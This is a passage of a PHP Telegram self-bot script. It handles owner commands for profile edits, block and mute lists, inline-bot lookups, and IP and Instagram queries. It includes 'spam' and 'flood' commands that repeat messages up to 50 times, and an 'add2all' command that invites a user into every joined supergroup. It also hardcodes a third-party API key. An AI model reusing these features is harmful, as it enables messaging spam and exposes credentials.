                        preg_match("/^[\/\#\!]?(setbio) (.*)$/si", $text, $m);
                        if (strlen($m[2]) < 70) {
                            yield $this->account->updateProfile(['about' => $m[2]]);
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɴᴇᴡ ᴀʙᴏᴜᴛ ꜱᴇᴛ✅"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '❌Bayad Kamtar Az 65 Character Bezani', 'reply_to_msg_id' => $msg_id]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(setusername) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setusername) (.*)$/si", $text, $m);
                        yield $this->account->updateUsername(['username' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɴᴇᴡ ᴜꜱᴇʀ ɴᴀᴍᴇ ꜱᴇᴛ✅"]);
                    }
                    if (preg_match("/^[\/\#\!]?(join) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(join) (.*)$/si", $text, $m);
                        yield $this->channels->joinChannel(['channel' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴊᴏɪɴᴇᴅ!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(add2all) (@.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(add2all) (@.*)$/si", $text, $m);
                        $dialogs = yield $this->getDialogs();
                        foreach ($dialogs as $peeer) {
                            $peer_info = yield $this->getInfo($peeer);
                            $peer_type = $peer_info['type'];
                            if ($peer_type == "supergroup") {
                                yield $this->channels->inviteToChannel(['channel' => $peeer, 'users' => [$m[2]]]);
                            }
                        }
                        $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴀᴅᴅᴇᴅ ᴛᴏ ᴀʟʟ ꜱᴜᴘᴇʀɢʀᴏᴜᴘꜱ"]);
                    }
                    if (preg_match("/^[\/\#\!]?(newanswer) (.*) \|\|\| (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(newanswer) (.*) \|\|\| (.*)$/si", $text, $m);
                        $txxt = $m[2];
                        $answeer = $m[3];
                        if (!isset($data['answering'][$txxt])) {
                            $data['answering'][$txxt] = $answeer;
                            yield $this->filePutContents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Nҽɯ Wσɾԃ ADDED Tσ AɳʂɯҽɾLιʂƚ"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Tԋιʂ Wσɾԃ Wαʂ Iɳ Aɳʂɯҽɾʅιʂƚ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(delanswer) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(delanswer) (.*)$/si", $text, $m);
                        $txxt = $m[2];
                        if (isset($data['answering'][$txxt])) {
                            unset($data['answering'][$txxt]);
                            yield $this->filePutContents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Wσɾԃ Dҽʅҽƚҽԃ Fɾσɱ Aɳʂɯҽɾʅιʂƚ"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Tԋιʂ Wσɾԃ Wαʂɳ'ƚ IN Aɳʂɯҽɾʅιʂƚ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(reset answers)$/si", $text)) {
                        $data['answering'] = [];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Aɳʂɯҽɾʅιʂƚ IS Nσɯ Eɱρƚყ"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setenemy) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setenemy) (.*)$/si", $text, $m);
                        if (!isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $mee = yield $this->getFullInfo($m[2]);
                            $me = $mee['User'];
                            $me_id = $me['id'];
                            $me_name = $me['first_name'];
                            if (!in_array($me_id, $data['enemies'])) {
                                $data['enemies'][] = $me_id;
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->contacts->block(['id' => $m[2]]);
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name ɪꜱ ɴᴏᴡ ɪɴ ᴇɴᴇᴍʏ ʟɪꜱᴛ"]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴜꜱᴇʀ ᴡᴀꜱ ɪɴ ᴇɴᴇᴍʏʟɪꜱᴛ"]);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(mute) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(mute) (.*)$/si", $text, $m);
                        if (!isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $mee = yield $this->getFullInfo($m[2]);
                            $me = $mee['User'];
                            $me_id = $me['id'];
                            $me_name = $me['first_name'];
                            if (!in_array($me_id, $data['muted'])) {
                                $data['muted'][] = $me_id;
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name ɪꜱ ɴᴏᴡ ᴍᴜᴛᴇ ʟɪꜱᴛ"]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜᴇ ᴜꜱᴇʀ ᴡᴀꜱ ɪɴ ᴍᴜᴛᴇʟɪꜱᴛ"]);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(delenemy) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(delenemy) (.*)$/si", $text, $m);
                        if (!isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $mee = yield $this->getFullInfo($m[2]);
                            $me = $mee['User'];
                            $me_id = $me['id'];
                            $me_name = $me['first_name'];
                            if (in_array($me_id, $data['enemies'])) {
                                $k = array_search($me_id, $data['enemies']);
                                unset($data['enemies'][$k]);
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->contacts->unblock(['id' => $m[2]]);
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name ᴅᴇʟᴇᴛᴇᴅ ꜰʀᴏᴍ ᴇɴᴇᴍʏ ʟɪꜱᴛ"]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴜꜱᴇʀ ᴡᴀꜱɴ'ᴛ ɪɴ ᴇɴᴇᴍʏʟɪꜱᴛ"]);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(unmute) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(unmute) (.*)$/si", $text, $m);
                        if (!isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $mee = yield $this->getFullInfo($m[2]);
                            $me = $mee['User'];
                            $me_id = $me['id'];
                            $me_name = $me['first_name'];
                            if (in_array($me_id, $data['muted'])) {
                                $k = array_search($me_id, $data['muted']);
                                unset($data['muted'][$k]);
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name ᴅᴇʟᴇᴛᴇᴅ ꜰʀᴏᴍ ᴍᴜᴛᴇ ʟɪꜱᴛ"]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴜꜱᴇʀ ᴡᴀꜱɴ'ᴛ ɪɴ ᴍᴜᴛᴇ ʟɪꜱᴛ"]);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(reset enemylist)$/si", $text)) {
                        $data['enemies'] = [];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴇɴᴇᴍʏʟɪꜱᴛ ɪꜱ ɴᴏᴡ ᴇᴍᴘᴛʏ!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(reset mutelist)$/si", $text)) {
                        $data['muted'] = [];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍ 𝑴𝒖𝒕𝒆𝑳𝒊𝒔𝒕 𝑰𝒔 𝑵𝒐𝒘 𝑬𝒎𝒑𝒕𝒚!**", 'parse_mode' => 'Markdown']);
                    }
                    if (preg_match("/^[\/\#\!]?(enemylist)$/si", $text)) {
                        if (count($data['enemies']) > 0) {
                            $txxxt = "ᴇɴᴇᴍʏʟɪꜱᴛ :
";
                            $counter = 1;
                            foreach ($data['enemies'] as $ene) {
                                $mee = yield $this->getFullInfo($ene);
                                $me = $mee['User'];
                                $me_name = $me['first_name'];
                                $txxxt .= "$counter: $me_name \n";
                                $counter++;
                            }
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txxxt]);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍ 𝑵𝒐 𝑬𝒏𝒆𝒎𝒚!**", 'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(mutelist)$/si", $text)) {
                        if (count($data['muted']) > 0) {
                            $txxxt = "ᴍᴜᴛᴇʟɪꜱᴛ :
";
                            $counter = 1;
                            foreach ($data['muted'] as $ene) {
                                $mee = yield $this->getFullInfo($ene);
                                $me = $mee['User'];
                                $me_name = $me['first_name'];
                                $txxxt .= "$counter: $me_name \n";
                                $counter++;
                            }
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txxxt]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ɴᴏ ᴍᴜᴛᴇᴅ!"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(inv) (@.*)$/si", $text) && $update['_'] == "updateNewChannelMessage") {
                        preg_match("/^[\/\#\!]?(inv) (@.*)$/si", $text, $m);
                        $peer_info = yield $this->getInfo($message['to_id']);
                        $peer_type = $peer_info['type'];
                        if ($peer_type == "supergroup") {
                            yield $this->channels->inviteToChannel(['channel' => $message['to_id'], 'users' => [$m[2]]]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴊᴜꜱᴛ ꜱᴜᴘᴇʀɢʀᴏᴜᴘꜱ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(leave)$/si", $text)) {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Leaved!"]);
                        yield $this->channels->leaveChannel(['channel' => $peer]);
                    }
                    if (preg_match("/^[\/\#\!]?(flood) ([0-9]+) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(flood) ([0-9]+) (.*)$/si", $text, $m);
                        $count = $m[2];
                        $txt = $m[3];
                        if ($count >= 51) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Max Count == 50", 'parse_mode' => 'MarkDown']);
                        } else {
                            $spm = "";
                            for ($i = 1; $i <= $count; $i++) {
                                $spm .= " $txt \n";
                            }
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $spm]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(spam) ([0-9]+) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(spam) ([0-9]+) (.*)$/si", $text, $m);
                        $count = $m[2];
                        $txt = $m[3];
                        if ($count >= 51) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Max Count == 50", 'parse_mode' => 'MarkDown']);
                        } else {
                            for ($i = 1; $i <= $count; $i++) {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => " $txt "]);
                            }
                        }
                    }

                    if (preg_match("/^[\/\#\!]?(encode) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(encode) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $enc = base64_encode($txt);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Encoded : $enc", 'parse_mode' => 'MarkDown']);
                    }
                    if (preg_match("/^[\/\#\!]?(nic) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(nic) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $url = yield $this->fileGetContents("https://citroapi.ir/nic/?key=Y3LC-EAAZ-75U9-5SDD&q=$txt");
                        $url2 = json_decode(yield $this->fileGetContents("https://citroapi.ir/nic/?key=Y3LC-EAAZ-75U9-5SDD&q=$txt"), true);
                        if (isJson($url)) {
                            $description = $url2['description'];
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => " $description "]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => " $url "]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(akschie) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(akschie) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $url = json_decode(yield $this->fileGetContents("https://api.codebazan.ir/caption/?pic=$txt"), true);
                        $message = $url['message'];
                        $messagefa = $url['messagefa'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
$message

", 'parse_mode' => 'HTML']);
                    }
                    if (preg_match("/^[\/\#\!]?(ipinfo) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(ipinfo) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $url = json_decode(yield $this->fileGetContents("https://citroapi.ir/ip/?key=Y3LC-EAAZ-75U9-5SDD&ip=$txt"), true);
                        if ($url['status'] == "fail") {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => " dorost bezan ip ro /= "]);
                        } else {
                            if (isset($url['city'])) {
                                $country = $url['country'];
                                $city = $url['city'];
                                $query = $url['query'];
                                $isp = $url['isp'];
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
اطلاعات آیپی : $query

کشور آیپی مورد نظر : $country

شهر : $city

دیتاسنتر : $isp
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
", 'parse_mode' => 'HTML']);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(insta) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(insta) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $url = json_decode(yield $this->fileGetContents("https://citroapi.ir/instagram/?key=Y3LC-EAAZ-75U9-5SDD&user=$txt"), true);
                        if ($url['status'] == "failed") {
                            $pagekifi = $url['description'];
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => " Error : $pagekifi "]);
                        } else {
                            if (isset($url['username'])) {
                                $username = $url['username'];
                                $followers = $url['followers'];
                                $user_id = $url['user_id'];
                                $followings = $url['followings'];
                                $profile = $url['profile'];
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
یوزر آیدی : $user_id

یوزر  : $username

تعداد فالوور ها : $followers

تعداد فاللویینگ ها : $followings

لینک عکس پروفایل : $profile
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
", 'parse_mode' => 'HTML']);
                            }
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(decode) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(decode) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $enc = base64_decode($txt);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Decoded : $enc", 'parse_mode' => 'MarkDown']);
                    }
                    if (preg_match("/^[\/\#\!]?(hash) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(hash) (.*)$/si", $text, $m);
                        $txt = $m[2];
                        $enc = md5($txt);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Hashed : $enc", 'parse_mode' => 'MarkDown']);
                    }
                    if (preg_match("/^[\/\#\!]?(music) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(music) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@melobot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }

                    if (preg_match("/^[\/\#\!]?(wiki) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(wiki) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@wiki", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(youtube) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(youtube) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@vid", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(pic) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(pic) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@pic", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(meme) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(meme) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@Persian_Meme_Bot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(calc) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(calc) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@CalcuBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(gif) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(gif) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@gif", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(blue) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(blue) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@TextMagicBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(apk) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(apk) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@apkdl_bot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(sticker) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(sticker) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@big_text_bot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(google) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(google) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@GoogleDEBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][rand(0, count($messages_BotResults['results']))]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(joke)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(joke)$/si", $text, $m);
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@function_robot", 'peer' => $peer, 'query' => '', 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][0]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(aasab)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(aasab)$/si", $text, $m);
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@function_robot", 'peer' => $peer, 'query' => '', 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][1]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(like) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(like) (.*)$/si", $text, $m);
                        $mu = $m[2];
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@like", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][0]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(panel)$/si", $text)) {
                        $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "•» 𝑶𝒑𝒆𝒏 𝑻𝒉𝒆 𝑺𝒆𝒍𝒇 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕 𝑷𝒂𝒏𝒆𝒍 «•", 'parse_mode' => 'MarkDown']);
                        $Helper = file_get_contents('helper.txt');
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@$Helper", 'peer' => $peer, 'query' => "pawnselfyspanel_", 'offset' => '0',]);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][0]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true,
                            'peer' => $peer, 'reply_to_msg_id' => $msg_id, 'query_id' => $query_id, 'id' => "$query_res_id",]);
                    }

                    if (preg_match("/^[\/\#\!]?(search) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(search) (.*)$/si", $text, $m);
                        $q = $m[2];
                        $res_search = yield $this->messages->search(['peer' => $peer, 'q' => $q, 'filter' => ['_' => 'inputMessagesFilterEmpty'], 'min_date' => 0, 'max_date' => time(), 'offset_id' => 0, 'add_offset' => 0, 'limit' => 50, 'max_id' => $message['id'], 'min_id' => 1]);
                        $texts_count = count($res_search['messages']);
                        $users_count = count($res_search['users']);
                        $this->messages->sendMessage(['peer' => $peer, 'message' => "Msgs Found: $texts_count \nFrom Users Count: $users_count"]);
                        foreach ($res_search['messages'] as $text) {
                            $textid = $text['id'];
                            yield $this->messages->forwardMessages(['from_peer' => $text, 'to_peer' => $peer, 'id' => [$textid]]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(font) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(font) (.*)$/si", $text, $m);
                        $query = $m[2];
                        $text2 = str_replace(' ', '+', $query);
                        $link = json_decode(yield $this->fileGetContents("http://api.codebazan.ir/font/?text=$text2"), true);
                        $link2 = $link["result"];
                        $Pawn1 = $link2['1'];
                        $Pawn2 = $link2['2'];
                        $Pawn3 = $link2['3'];
                        $Pawn4 = $link2['4'];
                        $Pawn5 = $link2['5'];
                        $Pawn6 = $link2['6'];
                        $Pawn7 = $link2['7'];
                        $Pawn8 = $link2['8'];
                        $Pawn9 = $link2['9'];
                        $Pawn10 = $link2['10'];
                        $Pawn11 = $link2['11'];
                        $Pawn12 = $link2['12'];
                        $Pawn13 = $link2['13'];
                        $Pawn14 = $link2['14'];
                        $Pawn15 = $link2['15'];
                        $Pawn16 = $link2['16'];
                        $Pawn17 = $link2['17'];
                        $Pawn18 = $link2['18'];
                        $Pawn19 = $link2['19'];
                        $Pawn20 = $link2['20'];
                        $Pawn21 = $link2['21'];
                        $Pawn22 = $link2['22'];
                        $Pawn23 = $link2['23'];
                        $Pawn24 = $link2['24'];
                        $Pawn25 = $link2['25'];
                        $Pawn26 = $link2['26'];
                        $Pawn27 = $link2['27'];
                        $Pawn28 = $link2['28'];
                        $Pawn29 = $link2['29'];
                        $Pawn30 = $link2['30'];
                        $Pawn31 = $link2['31'];
                        $Pawn32 = $link2['32'];
                        $Pawn33 = $link2['33'];
                        $Pawn34 = $link2['34'];
                        $Pawn35 = $link2['35'];
                        $Pawn36 = $link2['36'];
                        $Pawn37 = $link2['37'];
                        $Pawn38 = $link2['38'];
                        $Pawn39 = $link2['39'];
                        $Pawn40 = $link2['40'];
                        $Pawn41 = $link2['41'];
                        $Pawn42 = $link2['42'];
                        $Pawn43 = $link2['43'];
                        $Pawn44 = $link2['44'];
                        $Pawn45 = $link2['45'];
                        $Pawn46 = $link2['46'];
                        $Pawn47 = $link2['47'];
                        $Pawn48 = $link2['48'];
                        $Pawn49 = $link2['49'];
                        $Pawn50 = $link2['50'];
                        $Pawn51 = $link2['51'];
                        $Pawn52 = $link2['52'];
                        $Pawn53 = $link2['53'];
                        $Pawn54 = $link2['54'];
                        $Pawn55 = $link2['55'];
                        $Pawn56 = $link2['56'];
                        $Pawn57 = $link2['57'];
                        $Pawn58 = $link2['58'];
                        $Pawn59 = $link2['59'];
                        $Pawn60 = $link2['60'];
                        $Pawn61 = $link2['61'];
                        $Pawn62 = $link2['62'];
                        $Pawn63 = $link2['63'];
                        $Pawn64 = $link2['64'];
                        $Pawn65 = $link2['65'];
                        $Pawn66 = $link2['66'];
                        $Pawn67 = $link2['67'];
                        $Pawn68 = $link2['68'];
                        $Pawn69 = $link2['69'];
                        $Pawn70 = $link2['70'];
                        $Pawn71 = $link2['71'];
                        $Pawn72 = $link2['72'];
                        $Pawn73 = $link2['73'];
                        $Pawn74 = $link2['74'];
                        $Pawn75 = $link2['75'];
                        $Pawn76 = $link2['76'];
                        $Pawn77 = $link2['77'];
                        $Pawn78 = $link2['78'];
                        $Pawn79 = $link2['79'];
                        $Pawn80 = $link2['80'];
                        $Pawn81 = $link2['81'];
                        $Pawn82 = $link2['82'];
                        $Pawn83 = $link2['83'];
                        $Pawn84 = $link2['84'];
                        $Pawn85 = $link2['85'];
